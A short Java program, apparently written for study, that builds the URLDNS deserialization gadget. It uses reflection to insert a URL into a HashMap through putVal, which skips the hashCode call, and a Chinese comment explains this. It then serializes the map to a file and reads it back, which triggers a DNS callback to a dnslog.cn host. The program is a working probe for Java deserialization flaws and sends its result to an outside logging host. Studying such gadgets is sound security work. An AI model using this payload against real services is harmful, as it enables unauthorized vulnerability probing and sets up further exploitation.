import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.util.HashMap;

public class URLDNS2 {
    public static void main(String[] args) throws Exception {
        HashMap<URL,Integer> hashMap = new HashMap<>();
        URL url = new URL("http://urldns2.test.dnslog.cn");
        Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods();
        //直接反射调用HashMap的putVal方法，跳过了hashCode方法
        for(Method method:m){
            if(method.getName().equals("putVal")){
                method.setAccessible(true);
                method.invoke(hashMap,-1,url,0,false,true);
            }
        }

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("urldns2.bin"));
        objectOutputStream.writeObject(hashMap);
//
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("urldns2.bin"));
        objectInputStream.readObject();
    }
}

